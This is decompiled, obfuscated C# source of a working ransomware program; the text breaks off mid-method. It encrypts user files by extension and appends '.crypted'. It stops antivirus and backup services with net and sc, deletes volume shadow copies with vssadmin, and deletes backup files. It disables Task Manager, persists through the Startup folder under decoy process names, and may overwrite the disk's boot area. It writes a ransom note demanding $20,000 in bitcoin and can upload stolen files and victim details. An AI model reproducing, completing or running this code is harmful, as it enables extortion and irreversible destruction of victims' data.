using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using lowFQsJSlrFgr;

namespace MufMaOSvGyvz;

internal class IyUWqQZlcOSTLhq
{
	public class jtxivXeSYrLUbhy
	{
		private static StringCollection TBtLAydjtqh = new StringCollection();

		private static List<string> UGGVvOxBNDKjv = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains("Builder_Log") && !text.Contains("RSAKeys") && !text.Contains("HOW_TO_DECYPHER_FILES") && !text.EndsWith(".crypted") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(KYDuKlMFWLOzqeDUz))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(HJhinhnlOMNxIX) * 1024.0 * 1024.0 && FFbMRUzulqEpb == "YES")
							{
								UGGVvOxBNDKjv.Add(text);
							}
							else if (File.Exists(text) && FFbMRUzulqEpb == "NO")
							{
								UGGVvOxBNDKjv.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				array3 = array2;
				foreach (string string_ in array3)
				{
					WalkDirectoryTree(string_);
				}
			}
			return UGGVvOxBNDKjv;
		}
	}

	private sealed class qnaQFtvgrosG
	{
		public string[] qbsdORlwvxu;

		public void _003CMain_003Eb__5()
		{
			FAripJTXHNalmT.bTnVewWeool(qbsdORlwvxu);
		}
	}

	private sealed class ldXpuSFdlzXsf
	{
		public string[] wRpHEPAtkvsJOZo;

		public string[] vyUBfhhKAo;

		public string PrmBaLAeEGy;

		public string VWJpqjqHbP;
	}

	private sealed class uKOVEKzchnPsIO
	{
		public ldXpuSFdlzXsf rvBvEQIyVzuxrLj;

		public string KxwFjccKfD;

		public void _003CCrypt_003Eb__d()
		{
			FAKScXrbtoSt(KxwFjccKfD, rvBvEQIyVzuxrLj.wRpHEPAtkvsJOZo, rvBvEQIyVzuxrLj.VWJpqjqHbP, rvBvEQIyVzuxrLj.vyUBfhhKAo, rvBvEQIyVzuxrLj.PrmBaLAeEGy);
		}
	}

	private sealed class WbDnpXySnYPBD
	{
		public List<string> UIEWVHYeVoR;

		public List<string> fevfiSigOoErXD;

		public string RryKduFtzbfiPI;

		public string[] DhKhIlMiANCZ;

		public string KRFQhWmJuhVexr;

		public void _003CWorkerCrypter2_003Eb__15(string string_0)
		{
			foreach (string item in fevfiSigOoErXD)
			{
				if (DhKhIlMiANCZ.Length != 0)
				{
					string[] dhKhIlMiANCZ = DhKhIlMiANCZ;
					int num = 0;
					while (num < dhKhIlMiANCZ.Length)
					{
						string value = dhKhIlMiANCZ[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f0;
					}
				}
				if ((oCUqHyphdF == "NO" && !item.EndsWith(string_0)) || CfvwdOobMuXeStMb.Contains(item))
				{
					continue;
				}
				if (zKSeEXflLrlh == "YES")
				{
					try
					{
						if (MZxLtJzLRoIRU.vtOeVWNQhPdxNt(item))
						{
							MZxLtJzLRoIRU.RZJqgaZnLiq(item);
						}
					}
					catch
					{
					}
				}
				CfvwdOobMuXeStMb.Add(item);
				if (!CSiGcEXgTf.Contains(Path.GetDirectoryName(item)))
				{
					CSiGcEXgTf.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (fCiJsjNmDGYo == "YES" && fileStream.Length > Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024 && !UIEWVHYeVoR.Contains(string_0))
					{
						if (uySjNlajuEE == "YES")
						{
							foreach (string ulDHvcBRgNNLZtz in ulDHvcBRgNNLZtzS)
							{
								if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "YES")
								{
									if (Convert.ToInt32(uOyyfFtzedTPufn) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(ulDHvcBRgNNLZtz) && BtOESQEmmPY == "NO")
								{
									try
									{
										MfnxCHhUwIjyzc.OahdOXOuXvYsd("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = yZSyNMrNhJ.GoOtXsDsUX(item, Convert.ToInt32(tsQtKfDKZIMNuO) * 1024 * 1024);
						byte[] byte_2 = yZSyNMrNhJ.vIrcBMpRPIYwNsX(byte_, Encoding.ASCII.GetBytes(KRFQhWmJuhVexr), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						yZSyNMrNhJ.vGnSKjsiWPsmf(item, byte_2);
						if (RryKduFtzbfiPI != ".*")
						{
							File.Move(item, item + RryKduFtzbfiPI);
						}
					}
					else if (RryKduFtzbfiPI != ".*")
					{
						KfLhmyplGPYqxR(item, item + RryKduFtzbfiPI, ctSkisxFbkPzS);
					}
					else
					{
						KfLhmyplGPYqxR(item, item + ".part", ctSkisxFbkPzS);
					}
				}
				catch (Exception)
				{
				}
				IL_02f0:;
			}
		}
	}

	private sealed class IzImQwKqnmdl
	{
		public string MQXFfvSrdXstlCz;

		public string GhQNYBCsZpGoSQ;

		public void _003CEncrypt2_003Eb__18()
		{
			while (true)
			{
				try
				{
					File.Delete(MQXFfvSrdXstlCz);
					break;
				}
				catch
				{
				}
			}
		}

		public void _003CEncrypt2_003Eb__19()
		{
			while (true)
			{
				try
				{
					if (File.Exists(GhQNYBCsZpGoSQ))
					{
						File.Delete(GhQNYBCsZpGoSQ);
					}
					break;
				}
				catch
				{
				}
			}
		}
	}

	public static string xQMkqhCYTvWMq = "EVET";

	public static byte[] ctSkisxFbkPzS = null;

	public static string FFbMRUzulqEpb = "NO";

	public static string HJhinhnlOMNxIX = "100000000";

	public static List<string> siKfLgBTOtPOl = new List<string>();

	public static List<string> hkQMoFyHzQ = new List<string>();

	public static string JNHKDqKmSycXVyA = "NO";

	public static string KRFQhWmJuhVexr = "";

	public static string SMVGmorJMiSRUva = "NO";

	public static int hXaNTqTbRnpr = 0;

	public static string zKSeEXflLrlh = "NO";

	public static string LDNdJBbfsdAY = "NO";

	public static string kqxgiwAmxJZAF = "NO";

	public static string efojwxvnMIbXXP = "0";

	public static string IUvwjPVcqFrE = "YES";

	public static string QDIBAwivbzugjctV = "NO";

	public static string PVCmRrdzBeoM = "NO";

	public static string IBSndtoMdgy = "NO";

	public static List<string> wiZlVeXAvqcJt = new List<string>
	{
		"lsass.exe", "svchst.exe", "crcss.exe", "chrome32.exe", "firefox.exe", "calc.exe", "mysqld.exe", "dllhst.exe", "opera32.exe", "memop.exe",
		"spoolcv.exe", "ctfmom.exe", "SkypeApp.exe"
	};

	public static List<string> CSiGcEXgTf = new List<string>();

	public static string ELyYGppfySYfq = "YES";

	public static string udJVdpbosFv = "NO";

	public static string nEFvYMIALr = "NO";

	public static List<string> CfvwdOobMuXeStMb = new List<string>();

	public static string YkwRnYlFytdkH = "NO";

	private static string YQBusMLxsiehe = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string FsmxXwwVyXze = "YES";

	public static string OZagXxYpUbG = "NO";

	public static List<string> ypieyuCOltLWYFl = new List<string>
	{
		"stop avpsus /y", "stop McAfeeDLPAgentService /y", "stop mfewc /y", "stop BMR Boot Service /y", "stop NetBackup BMR MTFTP Service /y", "stop DefWatch /y", "stop ccEvtMgr /y", "stop ccSetMgr /y", "stop SavRoam /y", "stop RTVscan /y",
		"stop QBFCService /y", "stop QBIDPService /y", "stop Intuit.QuickBooks.FCS /y", "stop QBCFMonitorService /y", "stop YooBackup /y", "stop YooIT /y", "stop zhudongfangyu /y", "stop stc_raw_agent /y", "stop VSNAPVSS /y", "stop VeeamTransportSvc /y",
		"stop VeeamDeploymentService /y", "stop VeeamNFSSvc /y", "stop veeam /y", "stop PDVFSService /y", "stop BackupExecVSSProvider /y", "stop BackupExecAgentAccelerator /y", "stop BackupExecAgentBrowser /y", "stop BackupExecDiveciMediaService /y", "stop BackupExecJobEngine /y", "stop BackupExecManagementService /y",
		"stop BackupExecRPCService /y", "stop AcrSch2Svc /y", "stop AcronisAgent /y", "stop CASAD2DWebSvc /y", "stop CAARCUpdateSvc /y", "stop sophos /y"
	};

	public static List<string> YDWHvbVPBJ = new List<string> { "config SQLTELEMETRY start= disabled", "config SQLTELEMETRY$ECWDB2 start= disabled", "config SQLWriter start= disabled", "config SstpSvc start= disabled" };

	public static List<string> AgdpzRigFOYhsqvH = new List<string> { "/IM mspub.exe /F", "/IM mydesktopqos.exe /F", "/IM mydesktopservice.exe /F" };

	public static List<string> WRakAWHNtJErZ = new List<string>
	{
		"Delete Shadows /all /quiet", "resize shadowstorage /for=c: /on=c: /maxsize=401MB", "resize shadowstorage /for=c: /on=c: /maxsize=unbounded", "resize shadowstorage /for=d: /on=d: /maxsize=401MB", "resize shadowstorage /for=d: /on=d: /maxsize=unbounded", "resize shadowstorage /for=e: /on=e: /maxsize=401MB", "resize shadowstorage /for=e: /on=e: /maxsize=unbounded", "resize shadowstorage /for=f: /on=f: /maxsize=401MB", "resize shadowstorage /for=f: /on=f: /maxsize=unbounded", "resize shadowstorage /for=g: /on=g: /maxsize=401MB",
		"resize shadowstorage /for=g: /on=g: /maxsize=unbounded", "resize shadowstorage /for=h: /on=h: /maxsize=401MB", "resize shadowstorage /for=h: /on=h: /maxsize=unbounded", "Delete Shadows /all /quiet"
	};

	public static List<string> PMQqUDKVTQJ = new List<string> { "/s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk", "/s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.* d:\\*.set d:\\*.win d:\\*.dsk", "/s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.* e:\\*.set e:\\*.win e:\\*.dsk", "/s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.* f:\\*.set f:\\*.win f:\\*.dsk", "/s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.* g:\\*.set g:\\*.win g:\\*.dsk", "/s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win h:\\*.dsk" };

	public static string lMBJRPlmLoPIJX = "NO";

	public static string zHSVICJAOa = "NO";

	internal static DateTime OOZMRHMVMrmD = new DateTime(2000, 1, 1);

	internal static DateTime LViAigNUQAbNhB = new DateTime(2100, 1, 1);

	public static string fCiJsjNmDGYo = "YES";

	public static string tsQtKfDKZIMNuO = "10";

	public static string VgdNVBEBhpUPO = "NO";

	public static string rwJLUnGaYuk = "NO";

	public static string JntTsbLDjfdWrF = "NO";

	public static string WgQvAOsxNeWD = "YES";

	public static string qqibCzLAGVg = "NO";

	public static string uySjNlajuEE = "NO";

	public static List<string> ulDHvcBRgNNLZtzS = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string BtOESQEmmPY = "NO";

	public static string uOyyfFtzedTPufn = "1";

	public static string mlQgpavlrIuX = "YES";

	public static string oiSsXsWUMOtEp = "NO";

	public static string KkZoOVzwQPf = "NO";

	public static string idAGkbKivQU = string.Empty;

	public static string gremWWHIcFVT = "NO";

	public static string ldDdAgsFLTkAX = "YES";

	public static string ZPHPKQDuPKi = "YES";

	public static string rqOtfqTYGrTie = "SW5mb3JtYXRpb24uLi4=";

	public static string wrCDlMOHoXr = "WW91ciBGaWxlcyBhcmUgRW5jcnlwdGVkLg0KDQpEb27igJl0IHdvcnJ5LCB5b3UgY2FuIHJldHVybiBhbGwgeW91ciBmaWxlcyENCg0KWW91J3ZlIGdvdCA0OCBob3VycygyIERheXMpLCBiZWZvcmUgeW91IGxvc3QgeW91ciBmaWxlcyBmb3JldmVyLg0KSSB3aWxsIHRyZWF0IHlvdSBnb29kIGlmIHlvdSB0cmVhdCBtZSBnb29kIHRvby4NCg0KVGhlIFByaWNlIHRvIGdldCBhbGwgdGhpbmdzIHRvIHRoZSBub3JtYWwgOiAyMCwwMDAkDQpNeSBCVEMgV2FsbGV0IElEIDoNCjFGNnNxOFl2ZnRUZnVFNFFjWXhmSzhzNVhGVVVIQzdzRDkNCg0KQ29udGFjdCA6DQpqb3NlcGhudWxsQHNlY21haWwucHJvDQo=";

	public static string rtiZKDwSQcOQoyu = "NO";

	public static string aWdGZORAeYAJ = "NO";

	public static string oCUqHyphdF = "NO";

	public static string VneWBiDudYbxfV = "NO";

	public static string nrUdlkCMdxZ = "YES";

	public static string oarFYicwLcOiB = "LOGONISOFF";

	public static string wEFLZtRchlX = "YES";

	public static string WnYspfSeqpPPh = "NO";

	public static string KYDuKlMFWLOzqeDUz = "mystartup.lnk";

	public static string XKCeykQXWEYgem = "NO";

	public static string OZfhJywPQSn = "NO";

	public static string JGjnyMyTennfuufcT = "YES";

	public static string ylIKJJsgdllsSVj = "YES";

	public static string LcFYzbWwUuFdZ = "VGhhbm9z";

	public static string gcOHYvBogGyw = "YES";

	public static string amSYDuIqjtb = "NO";

	private static void Main(string[] args)
	{
		try
		{
			MPimnsOrmpnAX.IjTKmPwIgCf(YQBusMLxsiehe);
		}
		catch (Exception)
		{
		}
		try
		{
			if (gcOHYvBogGyw == "YES")
			{
				Thread thread = new Thread(hpvgypLXixi.YfdgCPKijzed);
				thread.Priority = ThreadPriority.Lowest;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (kqxgiwAmxJZAF == "YES")
		{
			Thread.Sleep(int.Parse(efojwxvnMIbXXP));
		}
		try
		{
			if (wEFLZtRchlX == "YES")
			{
				string text = jMDFRLEyorejfI.vgwIjtaVyLLgbVk();
				if (!text.Contains("Windows 10") && !text.Contains("Windows 8"))
				{
					jMDFRLEyorejfI.CFPjirxGMKMKPt();
				}
			}
		}
		catch (Exception)
		{
		}
		if (mlQgpavlrIuX == "YES")
		{
			try
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					qnaQFtvgrosG CS_0024_003C_003E8__locals0 = new qnaQFtvgrosG();
					CS_0024_003C_003E8__locals0.qbsdORlwvxu = new string[4] { "Taskmgr", "taskmgr", "ProcessHacker", "procexp" };
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						FAripJTXHNalmT.bTnVewWeool(CS_0024_003C_003E8__locals0.qbsdORlwvxu);
					});
					thread2.IsBackground = true;
					thread2.Start();
				}
			}
			catch
			{
			}
			try
			{
				qMyHPNTWke.CusTKXtiVMDCm("taskmgr");
			}
			catch
			{
			}
			try
			{
				qMyHPNTWke.CusTKXtiVMDCm("procexp");
			}
			catch
			{
			}
			try
			{
				qMyHPNTWke.CusTKXtiVMDCm("procexp64");
			}
			catch
			{
			}
			try
			{
				qMyHPNTWke.CusTKXtiVMDCm("ProcessHacker");
			}
			catch
			{
			}
			Thread thread3 = new Thread(FAripJTXHNalmT.QvJxjZHBdlZUQ);
			thread3.IsBackground = true;
			thread3.Start();
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && qqibCzLAGVg == "YES")
		{
			try
			{
				TQpGafavBJI("Set-MpPreference -EnableControlledFolderAccess Disabled");
			}
			catch
			{
			}
		}
		if (IUvwjPVcqFrE == "YES")
		{
			QLRuRgFESyg.PXPqDNdvjDrC();
		}
		if (PVCmRrdzBeoM == "YES" && !xxKHdLdCMeOG.DfTRTAsuFViXE())
		{
			xxKHdLdCMeOG.bfVvoFmZrqIvYF();
		}
		if (udJVdpbosFv == "YES" && xxKHdLdCMeOG.DfTRTAsuFViXE())
		{
			new tOQtIRDNrGpD().ywIDKStthl(bool_0: false);
			new tOQtIRDNrGpD().jkSoOuByvlwrEF();
		}
		if (LDNdJBbfsdAY == "YES")
		{
			ghEykQIAJr.aiPqAgDxThSDE();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text3 = text2 + Path.GetFileName(fileName);
		if (SMVGmorJMiSRUva == "YES" && fileName != text3)
		{
			Thread thread4 = new Thread(zstTHeVErMkJUU);
			thread4.IsBackground = true;
			thread4.Priority = ThreadPriority.Highest;
			thread4.Start();
		}
		if (JNHKDqKmSycXVyA == "YES" && mainModule != null && fileName != text3)
		{
			try
			{
				hXaNTqTbRnpr = DPxcFgWfJlePTF(0, wiZlVeXAvqcJt.Count);
				File.Copy(fileName, text2 + wiZlVeXAvqcJt[hXaNTqTbRnpr], overwrite: true);
				Process.Start(text2 + wiZlVeXAvqcJt[hXaNTqTbRnpr]);
				obllpHNmyTXvR();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (lMBJRPlmLoPIJX == "YES" && DateTime.Now < OOZMRHMVMrmD)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (zHSVICJAOa == "YES" && DateTime.Now > LViAigNUQAbNhB)
			{
				obllpHNmyTXvR();
			}
		}
		catch
		{
		}
		foreach (string item in ypieyuCOltLWYFl)
		{
			tbluQOozLSqDhFc("net.exe", item);
		}
		foreach (string item2 in YDWHvbVPBJ)
		{
			tbluQOozLSqDhFc("sc.exe", item2);
		}
		foreach (string item3 in AgdpzRigFOYhsqvH)
		{
			tbluQOozLSqDhFc("taskkill.exe", item3);
		}
		foreach (string item4 in WRakAWHNtJErZ)
		{
			tbluQOozLSqDhFc("vssadmin.exe", item4);
		}
		foreach (string item5 in PMQqUDKVTQJ)
		{
			tbluQOozLSqDhFc("del.exe", item5);
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			tbluQOozLSqDhFc("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
		}
		if (ELyYGppfySYfq == "YES" && LEYLEJpRfEgTMCc() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(IxJlmmAtIYbweZ.DtsYjXXFKl);
			thread5.IsBackground = true;
			thread5.Start();
		}
		if (!(OZagXxYpUbG == "YES"))
		{
		}
		if (VgdNVBEBhpUPO == "NO")
		{
			KRFQhWmJuhVexr = EOjDcEpeLmEa.BkigirNyAye(32);
		}
		else
		{
			KRFQhWmJuhVexr = "LD2WALLJZR93XK10KS892LMU006ZXO3Q";
		}
		string text4 = KcMVbmuWfLLu.QKUAgIgehqhgaII(KRFQhWmJuhVexr);
		if (ldDdAgsFLTkAX == "YES")
		{
			glLILXcrbW();
		}
		PDPmvqgvIguXKGS.BPwwjcgjbB(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), KYDuKlMFWLOzqeDUz), "C:\\Users\\user\\AppData\\Local\\Temp\\\\HOW_TO_DECYPHER_FILES.txt", null, null, "Installer...", "Ctrl+Shift+X", null);
		try
		{
			QvJELJzMCQJDDH(new string[1] { "[auto]" }, new string[101]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
				"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
				"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
				"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf",
				"7z"
			}, new string[0], KRFQhWmJuhVexr, ".crypted");
		}
		catch
		{
		}
		KRFQhWmJuhVexr = EOjDcEpeLmEa.BkigirNyAye(32);
		if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
		{
			using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
			streamWriter.WriteLine("Your files were safely cyphered.\r\n\r\nContact: my-contact-email@protonmail.com");
			streamWriter.WriteLine("\r\n");
			streamWriter.WriteLine("Key Identifier: ");
			streamWriter.WriteLine(text4);
			if (FsmxXwwVyXze == "NO")
			{
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine("Number of files that were processed is: " + Convert.ToString(CfvwdOobMuXeStMb.Count));
			}
		}
		else
		{
			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + text4);
		}
		foreach (string item6 in CSiGcEXgTf)
		{
			if (item6 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
			{
				continue;
			}
			try
			{
				if (!File.Exists(item6 + "\\HOW_TO_DECYPHER_FILES.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", item6 + "\\HOW_TO_DECYPHER_FILES.txt", overwrite: true);
				}
				else
				{
					File.AppendAllText(item6 + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + text4);
				}
			}
			catch (Exception)
			{
			}
		}
		if (JGjnyMyTennfuufcT == "YES")
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
				streamWriter.WriteLine("<html>\n<body style=\"background-color: black;\">\n<p style=\"text-align: center; background-color: black;\"><span style=\"color: #ff0000; background-color: black;\"><span style=\"background-color: #000000;\"><span style=\"background-color: #ff0000;\"><img src=\"https://cutewallpaper.org/21/skull-wallpaper-free/Skull-Wallpaper-3D-Wallpapers-Latest.jpg\" alt=\"\" width=\"650\" height=\"403\" /></span></span></span></p>\n\n<h2 style=\"text-align: center; color:red;\">\nYour Files are Encrypted.</h2><br>\n<p style=\"text-align: center; color:red; font-weight: bold;\">\nDon’t worry, you can return all your files!<br>\nI don't want to loose your files too. if i want to do something bad to you i would've wipe all of your network but that's not helping me. :)<br>\nso temporary all of your files is mine now until you pay the price of them.<br>\nIf you want to restore them contact me from the address below, i'll be happy to help you to get out of this situation.<br>\nYou've got 48 hours(2 Days), before you lost your files forever.<br>\nI will treat you good if you treat me good too.\n\n\n</p>\n<h3 style=\"color:yellow; text-align: center;\">The Price to get all things to the normal : 20,000$</h3>\n<h3 style=\"color:yellow; text-align: center;\"> My BTC Wallet ID : <p style=\"text-align: center; color:red;\">1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9</p> </h3> \n<h3 style=\"color:yellow; text-align: center;\">Contact : <br> josephnull@secmail.pro </h3>\n\n<h2 style=\"text-align: center; color:red;\">Contact: josephnull@secmail.pro </h2>\n</body>\n</html>");
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine("<p style=\"text-align: center;\">Key Identifier: ");
				streamWriter.WriteLine(text4 + "</p>");
				if (FsmxXwwVyXze == "NO")
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine("<p style=\"text-align: center;\">" + "Number of files that were processed is: " + Convert.ToString(CfvwdOobMuXeStMb.Count) + "</p>");
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta", "<p style=\"text-align: center;\">" + "\r\nAditional KeyId:\r\n" + text4 + "</p>");
			}
		}
		if (YkwRnYlFytdkH == "YES")
		{
			try
			{
				if (FsmxXwwVyXze == "NO")
				{
					MfnxCHhUwIjyzc.qkCGSsikzw("URL", "USERNAME", "ACCESO", "Client IP:  " + new WebClient().DownloadString("http://icanhazip.com") + "Date of encryption: " + default(DateTime).Date.ToString() + "\r\n" + "Number of files encrypted: " + Convert.ToString(CfvwdOobMuXeStMb.Count) + "\r\n" + "Possible affected files: " + "\r\n" + Convert.ToString(CfvwdOobMuXeStMb) + "\r\n" + "Client Unique Identifier Key: " + text4);
				}
				else
				{
					MfnxCHhUwIjyzc.qkCGSsikzw("URL", "USERNAME", "ACCESO", "Client IP:  " + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + "Date of encryption: " + default(DateTime).Date.ToString() + "\r\n" + "Possible affected files: " + "\r\n" + Convert.ToString(CfvwdOobMuXeStMb) + "\r\n" + "Client Unique Identifier Key: " + text4);
				}
			}
			catch
			{
			}
		}
		if (IBSndtoMdgy == "YES")
		{
			try
			{
				biNPKopUkiSJuO.UnNeRUofkpwgP(new Uri(""));
			}
			catch
			{
			}
		}
		if (JGjnyMyTennfuufcT == "NO")
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
			{
				Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
			}
		}
		else if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
		{
			Process.Start("mshta.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
		}
		if (ldDdAgsFLTkAX == "YES")
		{
			if (ZPHPKQDuPKi == "YES" && !string.IsNullOrEmpty(rqOtfqTYGrTie) && !string.IsNullOrEmpty(wrCDlMOHoXr))
			{
				BvfGoSdlqjPP(rqOtfqTYGrTie, wrCDlMOHoXr);
			}
			else
			{
				BvfGoSdlqjPP();
			}
		}
		if (oarFYicwLcOiB != "LOGONISOFF")
		{
			TQsIfIHUHFwOo(oarFYicwLcOiB);
		}
		if (!string.IsNullOrEmpty(idAGkbKivQU))
		{
			try
			{
				File.Delete(idAGkbKivQU);
			}
			catch
			{
			}
		}
		if (nrUdlkCMdxZ == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string text = XfZBgoPdPvsMCS();
				if (!text.Contains("Windows 10") && !text.Contains("Windows 8"))
				{
					ILwfcQVhzflf.hvKwMSNYgA("\\\\.\\PhysicalDrive0");
				}
			}
			catch
			{
			}
		}
		if (jMDFRLEyorejfI.tTkvXnIXBUwQ())
		{
			tbluQOozLSqDhFc("bcdedit.exe", "/deletevalue {default} safeboot");
		}
		if (xQMkqhCYTvWMq == "EVET")
		{
			obllpHNmyTXvR();
		}
	}

	public static void zstTHeVErMkJUU()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("This program requires Microsoft .NET Framework v. 4.82 or superior to run properly", "Atention!", (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int DPxcFgWfJlePTF(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> tsTJYQCcBKUvsb(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
